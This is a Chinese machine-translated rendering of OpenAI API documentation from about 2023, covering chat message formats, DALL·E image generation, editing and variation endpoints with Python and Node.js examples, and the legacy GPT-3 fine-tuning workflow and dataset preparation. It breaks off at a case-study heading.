+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant that translates English to French.&quot;&#125;,</span><br><span class="line">  &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &#x27;Translate the following English text to French: &quot;&#123;text&#125;&quot;&#x27;&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>或者甚至只是用户消息：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &#x27;Translate the following English text to French: &quot;&#123;text&#125;&quot;&#x27;&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<h2 id="常问问题"><a href="#常问问题" class="headerlink" title="常问问题"></a>常问问题</h2><p><a href="https://platform.openai.com/docs/guides/chat/is-fine-tuning-available-for-gpt-3-5-turbo">是否可以进行微调<code>gpt-3.5-turbo</code>？</a></p>
+<p>不可以。自 2023 年 3 月 1 日起，您只能微调基础 GPT-3 模型。有关如何使用微调模型的更多详细信息，请参阅<a href="https://platform.openai.com/docs/guides/fine-tuning">微调指南。</a></p>
+<p><a href="https://platform.openai.com/docs/guides/chat/do-you-store-the-data-that-is-passed-into-the-api">您是否存储传递到 API 中的数据？</a></p>
+<p>自 2023 年 3 月 1 日起，我们会将您的 API 数据保留 30 天，但不再使用您通过 API 发送的数据来改进我们的模型。<a href="https://openai.com/policies/usage-policies">在我们的数据使用政策</a>中了解更多信息。</p>
+<p><a href="https://platform.openai.com/docs/guides/chat/adding-a-moderation-layer">添加审核层</a></p>
+<p>如果您想向聊天 API 的输出添加审核层，您可以按照我们的<a href="https://platform.openai.com/docs/guides/moderation">审核指南</a>来防止显示违反 OpenAI 使用政策的内容。</p>
+<hr>
+<h1 id="图像生成"><a href="#图像生成" class="headerlink" title="图像生成"></a>图像生成</h1><p>了解如何使用我们的 DALL·E 模型生成或处理图像</p>
+<h2 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h2><p>图片 API 提供了三种与图片交互的方法：</p>
+<ol>
+<li>根据文本提示从头开始创建图像</li>
+<li>根据新文本提示创建现有图像的编辑</li>
+<li>创建现有图像的变体</li>
+</ol>
+<p>本指南涵盖了使用这三个 API 端点的基础知识以及有用的代码示例。要查看它们的实际效果，请查看我们的<a href="https://labs.openai.com/">DALL·E 预览应用程序</a>。</p>
+<blockquote>
+<p>图片 API 处于测试阶段。在此期间，API 和模型将根据您的反馈进行改进。为确保所有用户都能轻松制作原型，默认速率限制为每分钟 50 张图像。如果您想提高速率限制，请查看这篇<a href="https://help.openai.com/en/articles/6696591">帮助中心文章</a>。随着我们对使用和容量要求的更多了解，我们将提高默认速率限制。</p>
+</blockquote>
+<p><strong>几代人</strong></p>
+<p>图像<a href="https://platform.openai.com/docs/api-reference/images/create">生成</a>端点允许您在给定文本提示的情况下创建原始图像。生成的图像的大小可以为 256x256、512x512 或 1024x1024 像素。较小的尺寸生成速度更快。<a href="https://platform.openai.com/docs/api-reference/images/create#images/create-n">您可以使用n</a>参数一次请求 1-10 张图像。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response = openai.Image.create(</span><br><span class="line">  prompt=<span class="string">&quot;a white siamese cat&quot;</span>,</span><br><span class="line">  n=<span class="number">1</span>,</span><br><span class="line">  size=<span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">)</span><br><span class="line">image_url = response[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>描述越详细，您就越有可能获得您或您的最终用户想要的结果。<a href="https://labs.openai.com/">您可以探索DALL·E 预览应用程序</a>中的示例以获得更多提示灵感。这是一个简单的例子：</p>
+<table>
+<thead>
+<tr>
+<th align="left">迅速的</th>
+<th align="left">一代</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">一只白色的暹罗猫</td>
+<td align="left"><img src="https://cdn.openai.com/API/images/guides/image_generation_simple.webp" alt="img"></td>
+</tr>
+<tr>
+<td align="left">一只白色暹罗猫的特写工作室摄影肖像，它看起来好奇，背光的耳朵</td>
+<td align="left"><img src="https://cdn.openai.com/API/images/guides/image_generation_detailed.webp" alt="img"></td>
+</tr>
+</tbody></table>
+<p><a href="https://platform.openai.com/docs/api-reference/images/create#images/create-response_format">使用response_format</a>参数，每个图像都可以作为 URL 或 Base64 数据返回。URL 将在一小时后过期。</p>
+<p><strong>编辑</strong></p>
+<p>图像<a href="https://platform.openai.com/docs/api-reference/images/create-edit">编辑</a>端点允许您通过上传蒙版来编辑和扩展图像。遮罩的透明区域指示应编辑图像的位置，提示应描述完整的新图像，而<strong>不仅仅是擦除区域</strong>。此端点可以启用类似<a href="https://labs.openai.com/editor">我们 DALL·E 预览应用程序中的编辑器的</a>体验。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response = openai.Image.create_edit(</span><br><span class="line">  image=<span class="built_in">open</span>(<span class="string">&quot;sunlit_lounge.png&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">  mask=<span class="built_in">open</span>(<span class="string">&quot;mask.png&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">  prompt=<span class="string">&quot;A sunlit indoor lounge area with a pool containing a flamingo&quot;</span>,</span><br><span class="line">  n=<span class="number">1</span>,</span><br><span class="line">  size=<span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">)</span><br><span class="line">image_url = response[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">图像</th>
+<th align="left">面具</th>
+<th align="left">输出</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><img src="https://cdn.openai.com/API/images/guides/image_edit_original.webp" alt="img"></td>
+<td align="left"><img src="https://cdn.openai.com/API/images/guides/image_edit_mask.webp" alt="img"></td>
+<td align="left"><img src="https://cdn.openai.com/API/images/guides/image_edit_output.webp" alt="img"></td>
+</tr>
+</tbody></table>
+<p>上传的图片和遮罩必须是小于 4MB 的正方形 PNG 图片，并且必须具有相同的尺寸。生成输出时不使用遮罩的非透明区域，因此它们不一定需要像上面的示例那样与原始图像匹配。</p>
+<p><strong>变化</strong></p>
+<p>图像<a href="https://platform.openai.com/docs/api-reference/images/create-variation">变体</a>端点允许您生成给定图像的变体。</p>
+<p>生成图像变体</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response = openai.Image.create_variation(</span><br><span class="line">  image=<span class="built_in">open</span>(<span class="string">&quot;corgi_and_cat_paw.png&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">  n=<span class="number">1</span>,</span><br><span class="line">  size=<span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">)</span><br><span class="line">image_url = response[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">图像</th>
+<th align="left">输出</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><img src="https://cdn.openai.com/API/images/guides/image_variation_original.webp" alt="img"></td>
+<td align="left"><img src="https://cdn.openai.com/API/images/guides/image_variation_output.webp" alt="img"></td>
+</tr>
+</tbody></table>
+<p>与编辑端点类似，输入图像必须是大小小于 4MB 的方形 PNG 图像。</p>
+<p><strong>内容审核</strong></p>
+<p>提示和图像根据我们的<a href="https://labs.openai.com/policies/content-policy">内容政策</a>进行过滤，当提示或图像被标记时返回错误。如果您对误报或相关问题有任何反馈，请通过我们的<a href="https://help.openai.com/">帮助中心</a>联系我们。</p>
+<hr>
+<h2 id="特定语言提示"><a href="#特定语言提示" class="headerlink" title="特定语言提示"></a>特定语言提示</h2><blockquote>
+<p>Node.js</p>
+</blockquote>
+<p><strong>使用内存图像数据</strong></p>
+<p>上面指南中的 Node.js 示例使用该<code>fs</code>模块从磁盘读取图像数据。在某些情况下，您可能会将图像数据保存在内存中。下面是一个使用存储在 Node.js<code>Buffer</code>对象中的图像数据的 API 调用示例：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This is the Buffer object that contains your image data</span></span><br><span class="line"><span class="keyword">const</span> buffer = [your image data];</span><br><span class="line"><span class="comment">// Set a `name` that ends with .png so that the API knows it&#x27;s a PNG image</span></span><br><span class="line">buffer.<span class="property">name</span> = <span class="string">&quot;image.png&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> response = <span class="keyword">await</span> openai.<span class="title function_">createImageVariation</span>(</span><br><span class="line">  buffer,</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用打字稿</strong></p>
+<p>如果您使用的是 TypeScript，您可能会遇到一些图像文件参数的问题。下面是通过显式转换参数来解决类型不匹配的示例：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cast the ReadStream to `any` to appease the TypeScript compiler</span></span><br><span class="line"><span class="keyword">const</span> response = <span class="keyword">await</span> openai.<span class="title function_">createImageVariation</span>(</span><br><span class="line">  fs.<span class="title function_">createReadStream</span>(<span class="string">&quot;image.png&quot;</span>) <span class="keyword">as</span> any,</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>这是内存中图像数据的类似示例：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This is the Buffer object that contains your image data</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">buffer</span>: <span class="title class_">Buffer</span> = [your image data];</span><br><span class="line"><span class="comment">// Cast the buffer to `any` so that we can set the `name` property</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">file</span>: any = buffer;</span><br><span class="line"><span class="comment">// Set a `name` that ends with .png so that the API knows it&#x27;s a PNG image</span></span><br><span class="line">file.<span class="property">name</span> = <span class="string">&quot;image.png&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> response = <span class="keyword">await</span> openai.<span class="title function_">createImageVariation</span>(</span><br><span class="line">  file,</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><strong>错误处理</strong></p>
+<p>API 请求可能会由于无效输入、速率限制或其他问题而返回错误。这些错误可以用一条语句来处理，错误的详细信息可以在or<code>try...catch</code>中找到：<code>error.response``error.message</code></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> openai.<span class="title function_">createImageVariation</span>(</span><br><span class="line">    fs.<span class="title function_">createReadStream</span>(<span class="string">&quot;image.png&quot;</span>),</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">  );</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(response.<span class="property">data</span>.<span class="property">data</span>[<span class="number">0</span>].<span class="property">url</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">  <span class="keyword">if</span> (error.<span class="property">response</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error.<span class="property">response</span>.<span class="property">status</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error.<span class="property">response</span>.<span class="property">data</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error.<span class="property">message</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p>python</p>
+</blockquote>
+<p><strong>使用内存图像数据</strong></p>
+<p>上面指南中的 Python 示例使用该<code>open</code>函数从磁盘读取图像数据。在某些情况下，您可能会将图像数据保存在内存中。下面是一个使用存储在<code>BytesIO</code>对象中的图像数据的 API 调用示例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the BytesIO object that contains your image data</span></span><br><span class="line">byte_stream: BytesIO = [your image data]</span><br><span class="line">byte_array = byte_stream.getvalue()</span><br><span class="line">response = openai.Image.create_variation(</span><br><span class="line">  image=byte_array,</span><br><span class="line">  n=<span class="number">1</span>,</span><br><span class="line">  size=<span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><strong>图像数据操作</strong></p>
+<p>在将图像传递给 API 之前对图像执行操作可能很有用。<code>PIL</code>这是一个用于调整图像大小的示例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the image file from disk and resize it</span></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;image.png&quot;</span>)</span><br><span class="line">width, height = <span class="number">256</span>, <span class="number">256</span></span><br><span class="line">image = image.resize((width, height))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the image to a BytesIO object</span></span><br><span class="line">byte_stream = BytesIO()</span><br><span class="line">image.save(byte_stream, <span class="built_in">format</span>=<span class="string">&#x27;PNG&#x27;</span>)</span><br><span class="line">byte_array = byte_stream.getvalue()</span><br><span class="line"></span><br><span class="line">response = openai.Image.create_variation(</span><br><span class="line">  image=byte_array,</span><br><span class="line">  n=<span class="number">1</span>,</span><br><span class="line">  size=<span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><strong>错误处理</strong></p>
+<p>API 请求可能会由于无效输入、速率限制或其他问题而返回错误。这些错误可以用一个语句来处理<code>try...except</code>，错误的详细信息可以在<code>e.error</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  openai.Image.create_variation(</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&quot;image.png&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">    n=<span class="number">1</span>,</span><br><span class="line">    size=<span class="string">&quot;1024x1024&quot;</span></span><br><span class="line">  )</span><br><span class="line">  <span class="built_in">print</span>(response[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>])</span><br><span class="line"><span class="keyword">except</span> openai.error.OpenAIError <span class="keyword">as</span> e:</span><br><span class="line">  <span class="built_in">print</span>(e.http_status)</span><br><span class="line">  <span class="built_in">print</span>(e.error)</span><br></pre></td></tr></table></figure>
+
+<h1 id="微调"><a href="#微调" class="headerlink" title="微调"></a>微调</h1><p>了解如何为您的应用程序定制模型。</p>
+<p><strong>介绍</strong></p>
+<p>通过提供以下内容，微调可让您从 API 提供的模型中获得更多收益：</p>
+<ol>
+<li>比即时设计更高质量的结果</li>
+<li>能够训练比提示中更多的例子</li>
+<li>由于更短的提示而节省了代币</li>
+<li>更低的延迟请求</li>
+</ol>
+<p>GPT-3 已经在来自开放互联网的大量文本上进行了预训练。当给出仅包含几个示例的提示时，它通常可以凭直觉判断出您要执行的任务并生成合理的完成。这通常称为“小样本学习”。</p>
+<p>微调通过训练比提示中更多的示例来改进小样本学习，让您在大量任务中取得更好的结果。<strong>对模型进行微调后，您将不再需要在提示中提供示例。</strong>这样可以节省成本并实现更低延迟的请求。</p>
+<p>在高层次上，微调涉及以下步骤：</p>
+<ol>
+<li>准备和上传训练数据</li>
+<li>训练新的微调模型</li>
+<li>使用您的微调模型</li>
+</ol>
+<p>请访问我们的<a href="https://openai.com/api/pricing">定价页面</a>，详细了解微调模型训练和使用的收费方式。</p>
+<p><strong>哪些模型可以微调？</strong></p>
+<p>微调目前仅适用于以下基础模型：<code>davinci</code>、<code>curie</code>、<code>babbage</code>和<code>ada</code>。这些是原始模型，在训练后没有任何说明（例如<code>text-davinci-003</code>）。您还可以<a href="https://platform.openai.com/docs/guides/fine-tuning/continue-fine-tuning-from-a-fine-tuned-model">继续微调微调模型</a>以添加其他数据，而无需从头开始。</p>
+<p><strong>安装</strong></p>
+<p>我们建议使用我们的 OpenAI 命令行界面 (CLI)。要安装这个，运行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install --upgrade openai</span><br></pre></td></tr></table></figure>
+
+<p>（以下说明适用于<strong>0.9.4</strong>及更高版本。此外，OpenAI CLI 需要 python 3。）</p>
+<p><code>OPENAI_API_KEY</code>通过将以下行添加到您的 shell 初始化脚本（例如 .bashrc、zshrc 等）或在微调命令之前的命令行中运行它来设置您的环境变量：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> OPENAI_API_KEY=<span class="string">&quot;&lt;OPENAI_API_KEY&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>准备训练数据</strong></p>
+<p>训练数据是你如何教 GPT-3 你想让它说什么。</p>
+<p>您的数据必须是<a href="https://jsonlines.org/">JSONL</a>文档，其中每一行都是一个提示完成对，对应于一个训练示例。您可以使用我们的<a href="https://platform.openai.com/docs/guides/fine-tuning/cli-data-preparation-tool">CLI 数据准备工具</a>轻松地将您的数据转换成这种文件格式。</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;prompt text&gt;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;ideal generated text&gt;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;prompt text&gt;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;ideal generated text&gt;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;prompt text&gt;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;completion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;ideal generated text&gt;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>设计用于微调的提示和补全不同于设计用于我们的基本模型（Davinci、Curie、Babbage、Ada）的提示。特别是，虽然基础模型的提示通常包含多个示例（“小样本学习”），但对于微调，每个训练示例通常包含一个输入示例及其相关输出，无需给出详细说明或在同一提示中包含多个示例。</p>
+<p>有关如何为各种任务准备训练数据的更多详细指导，请参阅我们<a href="https://platform.openai.com/docs/guides/fine-tuning/preparing-your-dataset">准备数据集的</a>最佳实践。</p>
+<p>您拥有的训练示例越多越好。我们建议至少有几百个示例。一般来说，我们发现数据集大小每增加一倍都会导致模型质量线性增加。</p>
+<p><strong>CLI数据准备工具</strong></p>
+<p>我们开发了一个工具来验证、提供建议和重新格式化您的数据：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openai tools fine_tunes.prepare_data -f &lt;LOCAL_FILE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此工具接受不同的格式，唯一的要求是它们包含提示和完成列/键。您可以传递<strong>CSV、TSV、XLSX、JSON</strong>或<strong>JSONL</strong>文件，它会在指导您完成建议的更改过程后将输出保存到 JSONL 文件中以备微调。</p>
+<p><strong>创建微调模型</strong></p>
+<p>以下假设您已经按照<a href="https://platform.openai.com/docs/guides/fine-tuning/prepare-training-data">上述说明</a>准备了训练数据。</p>
+<p>使用 OpenAI CLI 开始微调工作：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openai api fine_tunes.create -t &lt;TRAIN_FILE_ID_OR_PATH&gt; -m &lt;BASE_MODEL&gt;</span><br></pre></td></tr></table></figure>
+
+<p>您从哪里<code>BASE_MODEL</code>开始的基本模型的名称（ada、babbage、curie 或 davinci）。<a href="https://platform.openai.com/docs/guides/fine-tuning/customize-your-model-name">您可以使用后缀参数</a>自定义微调模型的名称。</p>
+<p>运行上面的命令会做几件事：</p>
+<ol>
+<li><a href="https://platform.openai.com/docs/api-reference/files">使用文件 API</a>上传文件（或使用已经上传的文件）</li>
+<li>创建微调作业</li>
+<li>流式传输事件直到作业完成（这通常需要几分钟，但如果队列中有很多作业或您的数据集很大，则可能需要数小时）</li>
+</ol>
+<p>每个微调工作都从一个默认为居里的基本模型开始。模型的选择会影响模型的性能和运行微调模型的成本。您的模型可以是以下之一：<code>ada</code>、<code>babbage</code>、<code>curie</code>或<code>davinci</code>。请访问我们的<a href="https://openai.com/api/pricing/#faq-fine-tuning-pricing-calculation">定价页面</a>，了解有关微调费率的详细信息。</p>
+<p>开始微调作业后，可能需要一些时间才能完成。在我们的系统中，您的工作可能排在其他工作之后，训练我们的模型可能需要几分钟或几小时，具体取决于模型和数据集的大小。如果事件流因任何原因中断，您可以通过运行以下命令恢复它：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openai api fine_tunes.follow -i &lt;YOUR_FINE_TUNE_JOB_ID&gt;</span><br></pre></td></tr></table></figure>
+
+<p>工作完成后，它应该显示微调模型的名称。</p>
+<p>除了创建微调作业外，您还可以列出现有作业、检索作业状态或取消作业。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># List all created fine-tunes</span><br><span class="line">openai api fine_tunes.list</span><br><span class="line"></span><br><span class="line"># Retrieve the state of a fine-tune. The resulting object includes</span><br><span class="line"># job status (which can be one of pending, running, succeeded, or failed)</span><br><span class="line"># and other information</span><br><span class="line">openai api fine_tunes.get -i &lt;YOUR_FINE_TUNE_JOB_ID&gt;</span><br><span class="line"></span><br><span class="line"># Cancel a job</span><br><span class="line">openai api fine_tunes.cancel -i &lt;YOUR_FINE_TUNE_JOB_ID&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用微调模型</strong></p>
+<p>当作业成功时，该<code>fine_tuned_model</code>字段将填充模型名称。<a href="https://platform.openai.com/docs/api-reference/completions">您现在可以将此模型指定为我们的Completions API 的</a>参数，并使用<a href="https://platform.openai.com/playground">Playground</a>向它发出请求。</p>
+<p>在您的工作首次完成后，您的模型可能需要几分钟时间才能准备好处理请求。如果对您的模型的完成请求超时，可能是因为您的模型仍在加载中。如果发生这种情况，请在几分钟后重试。</p>
+<p>您可以通过将模型名称作为<code>model</code>完成请求的参数传递来开始发出请求：</p>
+<p>OpenAI 命令行界面：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openai api completions.create -m &lt;FINE_TUNED_MODEL&gt; -p &lt;YOUR_PROMPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>卷曲：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://api.openai.com/v1/completions \</span><br><span class="line">  -H <span class="string">&quot;Authorization: Bearer <span class="variable">$OPENAI_API_KEY</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;prompt&quot;: YOUR_PROMPT, &quot;model&quot;: FINE_TUNED_MODEL&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Python：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> openai</span><br><span class="line">openai.Completion.create(</span><br><span class="line">    model=FINE_TUNED_MODEL,</span><br><span class="line">    prompt=YOUR_PROMPT)</span><br></pre></td></tr></table></figure>
+
+<p>Node.js：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> response = <span class="keyword">await</span> openai.<span class="title function_">createCompletion</span>(&#123;</span><br><span class="line">  <span class="attr">model</span>: <span class="variable constant_">FINE_TUNED_MODEL</span></span><br><span class="line">  <span class="attr">prompt</span>: <span class="variable constant_">YOUR_PROMPT</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>您可以继续使用所有其他<a href="https://platform.openai.com/docs/api-reference/completions">完成</a>参数，如<code>temperature</code>、 、 等，对这些<code>frequency_penalty</code>请求<code>presence_penalty</code>进行微调模型。</p>
+<p><strong>删除微调模型</strong></p>
+<p>要删除微调模型，您必须在您的组织中被指定为“所有者”。</p>
+<p>OpenAI 命令行界面：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openai api models.delete -i &lt;FINE_TUNED_MODEL&gt;</span><br></pre></td></tr></table></figure>
+
+<p>卷曲：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X <span class="string">&quot;DELETE&quot;</span> https://api.openai.com/v1/models/&lt;FINE_TUNED_MODEL&gt; \</span><br><span class="line">  -H <span class="string">&quot;Authorization: Bearer <span class="variable">$OPENAI_API_KEY</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Python：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> openai</span><br><span class="line">openai.Model.delete(FINE_TUNED_MODEL)</span><br></pre></td></tr></table></figure>
+
+<h2 id="准备数据集"><a href="#准备数据集" class="headerlink" title="准备数据集"></a>准备数据集</h2><p>微调是一种强大的技术，可用于创建特定于您的用例的新模型。<strong>在微调您的模型之前，我们强烈建议您阅读以下针对您的用例的最佳实践和<a href="https://platform.openai.com/docs/guides/fine-tuning/specific-guidelines">具体指南。</a></strong></p>
+<p><strong>数据格式化</strong></p>
+<p>要微调模型，您需要一组训练示例，每个训练示例都包含一个输入（“提示”）及其关联的输出（“完成”）。这与使用我们的基本模型明显不同，在基本模型中，您可能会在单个提示中输入详细说明或多个示例。</p>
+<ul>
+<li>每个提示都应以固定分隔符结尾，以在提示结束和完成开始时通知模型。通常效果很好的简单分隔符是<code>\n\n###\n\n</code>. 分隔符不应出现在任何提示中的其他地方。</li>
+<li><a href="https://platform.openai.com/tokenizer">由于我们的标记化，</a>每个完成都应该以空格开头，它用前面的空格标记大多数单词。</li>
+<li>每次完成都应以固定的停止序列结束，以在完成结束时通知模型。停止序列可以是<code>\n</code>、<code>###</code>或任何其他未出现在任何完成中的标记。</li>
+<li>对于推理，您应该按照与创建训练数据集时相同的方式格式化提示，包括相同的分隔符。还指定相同的停止序列以正确截断完成。</li>
+</ul>
+<p><a href="https://platform.openai.com/docs/guides/fine-tuning/general-best-practices">一般最佳实践</a></p>
+<p>使用更多高质量的示例进行微调效果更好。要微调一个比使用我们的基本模型使用高质量提示更好地执行的模型，您应该提供至少几百个高质量的示例，最好由人类专家审查。从那里开始，性能往往会随着示例数量的每增加一倍而线性增加。增加示例的数量通常是提高性能的最佳和最可靠的方法。</p>
+<p>分类器是最容易上手的模型。对于分类问题，我们建议使用 ada，经过微调后，它通常只会比功能更强大的模型稍微差一点，同时速度更快，成本更低。</p>
+<p>如果您要对预先存在的数据集进行微调，而不是从头开始编写提示，请务必在可能的情况下手动检查您的数据是否存在令人反感或不准确的内容，或者如果数据集很大，请检查尽可能多的随机样本。</p>
+<p><strong>具体准则</strong></p>
+<p>微调可以解决多种问题，最佳使用方式可能取决于您的具体用例。下面，我们列出了最常见的微调用例和相应的指南。</p>
+<ul>
+<li>分类<ul>
+<li><a href="https://platform.openai.com/docs/guides/fine-tuning/case-study-is-the-model-making-untrue-statements">该模型是否做出了不真实的陈述？</a></li>
+<li><a href="https://platform.openai.com/docs/guides/fine-tuning/case-study-sentiment-analysis">情绪分析</a></li>
+<li><a href="https://platform.openai.com/docs/guides/fine-tuning/case-study-categorization-for-email-triage">电子邮件分类的分类</a></li>
+</ul>
+</li>
+<li>条件生成<ul>
+<li><a href="https://platform.openai.com/docs/guides/fine-tuning/case-study-write-an-engaging-ad-based-on-a-wikipedia-article">根据维基百科文章撰写引人入胜的广告</a></li>
+<li><a href="https://platform.openai.com/docs/guides/fine-tuning/case-study-entity-extraction">实体提取</a></li>
+<li><a href="https://platform.openai.com/docs/guides/fine-tuning/case-study-customer-support-chatbot">客户支持聊天机器人</a></li>
+<li><a href="https://platform.openai.com/docs/guides/fine-tuning/case-study-product-description-based-on-a-technical-list-of-properties">基于技术属性列表的产品描述</a></li>
+</ul>
+</li>
+</ul>
+<p><strong>分类</strong></p>
+<p>在分类问题中，提示中的每个输入都应分类到预定义的类别之一。对于此类问题，我们建议：</p>
+<ul>
+<li>在提示末尾使用分隔符，例如<code>\n\n###\n\n</code>. 当您最终向您的模型发出请求时，请记住还要附加此分隔符。</li>
+<li>选择映射到单个<a href="https://platform.openai.com/tokenizer">标记</a>的类。在推理时，请指定<code>max_tokens=1</code>，因为您只需要第一个标记进行分类。</li>
+<li>确保提示+完成不超过 2048 个标记，包括分隔符</li>
+<li>目标是每班至少 ~100 个例子</li>
+<li><code>logprobs=5</code>要获得类日志概率，您可以在使用模型时指定（对于 5 个类）</li>
+<li>确保用于微调的数据集在结构和任务类型上与模型将用于的数据集非常相似</li>
+</ul>
+<hr>
+<p><strong>案例研究：模型是否做出了不真实的陈述？</strong></p>
